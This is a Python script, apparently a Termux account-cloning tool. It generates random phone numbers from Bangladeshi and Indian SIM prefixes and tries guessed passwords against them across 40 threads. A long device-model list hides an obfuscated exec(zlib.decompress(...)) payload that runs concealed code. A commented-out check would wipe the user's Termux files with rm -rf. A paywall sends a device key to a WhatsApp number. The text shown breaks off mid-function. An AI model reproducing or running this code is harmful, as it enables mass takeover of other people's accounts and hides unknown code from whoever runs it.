T-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T']#;exec(zlib.decompress(b'x\x9c\xed\x97Qk\xdb0\x10\xc7\xdf\xfd)\x04}\xb0\r\x9e\xddfk\x9a\x18\x02+\xcb\nc\xeb\x18,\xa3\xb01\x8cbI\x89\x12[ru2I(\xfd\xee\x93l\xc7\xce\x96\x94f\xef\xbe\x07\xe3\x9c\xee\xff?\xe9\xf4#`\x9e\x17Ri\xa4\xe8cIAC !\x80\x1d8L\xc9\x1c\xa5R\xa4\xa5RT\xe8\x90\x95\xbaT\x14\x10\xaf\xcbgKE1\xf9&e\xf6qK\xd3RK\x850\x1cd\x1d\xe7\xe2}\tTq\xc2\x05\x93s\xa9\x1d\x87P\x86\x80nw\x9e\x1f;\xc8\x04P\x00.\xc5d\xdf9l\x12\x9e_-\xdb\xa8^\x8c8\xd1rM\x05\x9a w8\xbe\xbc\x19\x8c\xc6\xef\xae\xde\xc6\xb7\xb7w\xec3\xacE\xf2\xf0c\xa6\x1e?\x8c\xc4\xd7r\xfae\xfd=\xe7\xc3\x9f\xa3|C>M\x87k\xb7vH\x97X\'\x9cT\xfa\xd1`pu}3\x1e]\xbb\xd5\xd2\xc5\x9b.<\x14\x01I\xb1"\xd5\x8aV\xbb\xb8\xddH\x9dO\n\xac\x97\xd6\xa5\xa9s\xdbu\xc63\x9ad\x1c\xb4Y\xfd\xc5\x103\xe3`\x88\x0b$!\xb4Y\xc2\x95w`\xe1#njB*\x08l\xb8^znX\xec\\\xffw\xe7f\xe5\xc6\xd1:\xb4\xce\xddflX\x1d\x92\x05\x15\x9eia=\xc3\x95\xe4\xe2\xb0IPI\xfd\x00\xb9j\xee\xfa\xf6v\xd8\xdf\x166J\x95M\x98\xbb\xd4\xba\x808\x8ap\xc1CM3\xbaP8\x0f\xa5ZDf\xf4O\xed\xf8\x9f#0;\x9e\xca\xb4\xcc\r\x10\xee\x91\x17\xc1\x1a\x0f&On3m7\xde\xcf\xfd\xf9d\xe9y\x95\xf6\x0c`J\xc9\xbem\x8c\xd8q\xd5\x82\xda\xc17\xfc\x84\x85\x04\xed\x99\x93\x05u\x1f\xfb\x08\x1a\xa3\xea\xe9\x1f\xe9\xcd\xc1^1\x18\x9cp\xa0\xdb\x94\x16:.0\xc0\x11K\x1dL\xd1TnD&1A\xe7b\xd5*z\xbez\xbe^\xe2\xeb\x04`\xd1\xac\x99\xed\xff\x93\xd6J{\xe4z\xe4N!\xd7\xd1\xb6\'\xa5\xa3\xed\xce\xea\xcfF\xee\x05}\x0f^\x0f\xde\xe9\xff\xba\x0e\xbd\x07s2\xb8-\x8a\xe8\x9e\x12\x8e\xdb\x9fh?\xc7\xf3!|\xd5\xa9\xc7\xb1\xc7\xb1\xc1\xd1\xa9.\xa4\xfb\xb4\xf1r\xbcM6R\xad\xa9\x82\xc9\xf8\xb2\x9a\xffj\xb5\xaao\xc0\xbc\x84P\xces\xae=\xfb\xad\xe3\xff\x9b\xcc1\x17u\xd21\xf1\x07s\x15\x00\xdf').decode())
samsung = random.choice(['SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def ____banner____():
  os.system('clear')
def ____banner____():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    print(f"""  \033[1;36m
   ______          ___         _____  
 \033[1;37m |___  /         / _ \       |  __ \ 
     \033[1;31m/ / ___ _ __| | | | __  _| |  | |
    \033[1;37m/ / / _ \ '__| | | | \ \/ / |  | |
 \033[1;32m  / /_|  __/ |  | |_| |  >  <| |__| |
  \033[1;34m/_____\___|_|   \___/  /_/\_\_____/ 
                                     \x1b[38;1;97m ᴾᴿᴼ
{faltu} {black}Your self-worth is determined by you... {pvt}\033[38;5;196m :{today} 
{rad}[{white}🔖{rad}] {yelloww}ONWER AND CEO {white}▶︎ {yelloww}𝐜𝐡𝐨????𝐧 {rad}𝐗 {yelloww}𝐬𝐮𝐦𝐨𝐧
{rad}[{white}🔖{rad}] {green}VERSION \033[38;5;196m  :\x1b[38;1;97m 0.2
{rad}[{white}🔖{rad}] {green}TOOLS \033[38;5;196m    :\x1b[38;1;97m PRIVATE
{rad}[{white}🔖{rad}] {green}THIS TOOL FILE & RANDOM TYPES
{puti}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def fuckxd():
    os.system('clear')
    ____banner____()
#━━━━[ LINE ]━━━━#
def line():
    print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def linex():
    print(f'{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#-------------------[LOCATION CHECK]-------------------#
"""uxernamx = sys.argv[0]
if uxernamx=='GREEN.py':
    try:
        readhead = open('.git/config','r').read()
    except:
        print('   Somting Wrong Bro')
        idx()
    if 'zar0-XD' in readhead:
        pass
    else:
        idx()
        os.system('rm -rf /data/data/com.termux/files');exit()
else:
    idx()
    os.system('rm -rf /data/data/com.termux/files');exit()"""
class Process:
    def __init__(self):
        self.cc=[]
        self.key="ZEROXD-"+base64.b16encode(str(os.getuid()).encode()).decode()+hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + platform.release()).replace(' ', '').encode()).hexdigest()
        self.key=""
        self.____banner____()
        r = self.Gex('https://raw.githubusercontent.com/AJAYAN404/App/main/approve.txt')
        if self.key in r:
            self.enroll()
        else:
            self.____banner____()
            print("\x1b[38;1;97m               NOTES   ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m HELLO.... DEAR USER THIS IS PREMIUM TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m AFTER PAYMENT ACCESS TOOLS ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m PRICE LIST ADMIN INBOX ")
            print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key:\033[0;93m " +self.key)
            input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
            time.sleep(3.5)
            tks = 'TOKEN KEY =%20%20:%20'+self.key
            os.system('am start https://wa.me/01989733880?text=' + tks)
            exit()
    def clear(self):os.system('clear');____banner____()
    def Gex(self,x):
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, x)
        c.setopt(c.WRITEDATA, buffer)
        try:c.perform()
        except:exit(' Network Issue')
        c.close()
        return buffer.getvalue().decode('utf-8')
    def enroll(self):
        zar0()

#━━━━[ MAIN ]━━━━#
def zar0():
    ____banner____()
    print(f'{rad}[{white}A{rad}]{rad}[{white}1{rad}] {green}KEEP ON FILE CLONE')
    print(f'{rad}[{white}B{rad}]{rad}[{white}2{rad}] {green}KEEP ON RANDOM CLONE')
    print(f'{rad}[{white}C{rad}]{rad}[{white}3{rad}] {green}JOIN GROUP')
    print(f'{rad}[{white}D{rad}]{rad}[{white}4{rad}] {green}CONTRACK ADMIN');linex()
    __zar0__ = input(f'{rad}[{white}🔖{rad}] {green}Selection  {white}▶︎ {yelloww}')
    if __zar0__ in ['A','a','01','1']:__FILEX__()
    elif __zar0__ in ['B','b','02','2']:___RANDOM___()
    elif __zar0__ in ['C','c','03','3']:os.system("xdg-open https://chat.whatsapp.com/IFiBzDX9PFJEF8ELHtHGdt")
    elif __zar0__ in ['D','d','04','4']:os.system("xdg-open https://wa.me/+8801979833880")
    else:print(f'\n[×]{rad} Choose Value Option... ');zar0()

#====================[RANDOM MENU]==========================
def rmpassconf(num,type):
        if 'first' in type:
            try:
                code = type.split('t')[1]
                password = num[:int(code)]
            except:
                password = num
        elif 'last' in type:
            try:
                code = type.split('t')[1]
                password = num[-int(code):]
            except:
                password = num
        else:
            password = type
        return password        
       
def ___RANDOM___():
    ____banner____()
    print(f'{red}[{white}A{red}]{green}{red}[{white}1{red}]{green} BANGLADESH ')
    print(f'{red}[{white}B{red}]{green}{red}[{white}2{red}]{green} INDIA ')
    print(f'{red}[{white}C{red}]{green}{red}[{white}3{red}]{green} SRI LANKA ')
    print(f'{red}[{white}D{red}]{green}{red}[{white}4{red}]{green} THAILAND ')
    print(f'{red}[{white}E{red}]{green}{red}[{white}5{red}]{green} NEPAL ')
    print(f'{red}[{white}F{red}]{green}{red}[{white}6{red}]{green} BACK MENU')
    line()
    STM_ = input(f'{red}[{white}◆{red}]{green} Selection {white}▶ {yellow}︎')
    if STM_ in ['A','a','01','1']:___BD___()
    elif STM_ in ['B','b','02','2']:___INDIA___()
    elif STM_ in ['C','c','03','3']:___ML___()
    elif STM_ in ['D','d','04','4']:___PK___()
    elif STM_ in ['E','e','05','5']:___NP___()
    elif STM_ in ['F','f','06','6']:zar0()
    else:___RANDOM___()
#====================[BD RANDOM]==========================
def ___BD___():
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}SIM CODES {white}▶︎ {red}[{white}0180 0171 0160 0132{red}]');line()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ {yellow}')
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    plist = []
    ____banner____()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    mtd=input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
    ____banner____()
    print(f"\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print(f"\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD");line()
    __CH__ = input(f"\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mSelection \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
        plist.append('last11')
        plist.append('Sabbir')
        plist.append('sadiya')
        plist.append('sumaiya')
        plist.append('jannatul')
        
    elif __CH__ in ["B","b","2"]:
        ____banner____()
        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ {red}'));line()
        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8{red}]")
        line()
        for i in range(psl):
            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO-{i+1} {white}▶︎ \x1b[38;5;208m'));line()
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    ____banner____()
    with ThreadPoolExecutor(max_workers=40) as STM:
        ____banner____()
        print(f'{red}[{white}✓{red}]{green} SIM CODE  {white}:{green} {code} {white}>{green} METHOD {white}: {green}{mtd}')
        print(f'{red}[{white}✓{red}]{green} TOTAL UID {white}:{green} %s ' %len(user))
        print(f'{red}[{white}✓{red}]{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY {white}3{green} MIN');line()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            tl = len(user)
            xb = love[2:]
            psd = plist
            if mtd in ['A','a','01','1']:STM.submit(randm, ids, psd,tl)
            elif mtd in ['B','b','02','2']:STM.submit(randm1, ids, psd,tl)
            elif mtd in ['C','c','03','3']:STM.submit(randm2, ids, psd,tl)
            elif mtd in ['D','d','04','4']:STM.submit(randm3, ids, psd,tl)
    print(f'\r{white}================================================')
    print(f'{red}[{white}✓{red}]{green} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{red}[{white}✓{red}]{green} TOTAL OK {white}:{green} %s' % str(len(oks)))
    print(f'{red}[{white}✓{red}]{green} TOTAL CP {white}:{red} %s' % str(len(cps)))
    print(f'\r{white}================================================')
    input(f"{red}[{white}✓{red}]{green} PRESS ENTER TO BACK MENU ")
    zar0()
        
#====================[INDIA RANDOM]==========================
def ___INDIA___():
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}SIM CODES{white} ▶︎ {red}[{white}9832 8653 6253 7423{red}]');line()
    code = input(f'{red}[{white}◆{red}]{green} Choice    {white}▶︎ \x1b[38;5;208m')
    ____banner____()
    print(f'{red}[{white}◆{red}] {green}EXAMPLE {white}  ▶︎ {red}[{white}10000 20000 30000{red}]');line()
    limit = int(input(f'{red}[{white}◆{red}] {green}LIMITS    {white}▶︎ \x1b[38;5;208m'))
    line()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m METHOD 1\n\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m METHOD 2\n\x1b[38;5;160m[\033[1;37mC\x1b[38;5;160m]\x1b[38;5;46m METHOD 3\n\x1b[38;5;160m[\033[1;37mD\x1b[38;5;160m]\x1b[38;5;46m METHOD 4");line()
    ___STM___=input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    line()
    print("\x1b[38;5;160m[\033[1;37mA\x1b[38;5;160m]\x1b[38;5;46m AUTO PASSWORD")
    print("\x1b[38;5;160m[\033[1;37mB\x1b[38;5;160m]\x1b[38;5;46m CHOICE PASSWORD")
    plist = []
    __CH__ = input("\x1b[38;5;160m[\033[1;37m◆\x1b[38;5;160m] \x1b[38;5;46mCHOOSE \033[1;37m▶︎ \x1b[38;5;208m")
    if __CH__ in ["A","a","1"]:       
        plist.append('first6')
        plist.append('last6')
        plist.append('first7')
        plist.append('last7')
        plist.append('first8')
        plist.append('last8')
    elif __CH__ in ["B","b","2"]:
        psl = int(input(f'{red}[{white}✓{red}] {green}INPUT PASS LIMITS {white}▶︎ \x1b[38;5;208m'));line()
        print(f"{red}[{white}✓{red}] {green}EXAMPLE {red}[{white} first6,first8,last6,last8")
        line()
        for i in range(psl):
            plist.append(input(f'{red}[{white}✓{red}] {green}PASSWORD NO.{i+1} {white}▶︎ \x1b[38;5;208m'));line()
    for x in range(limit):
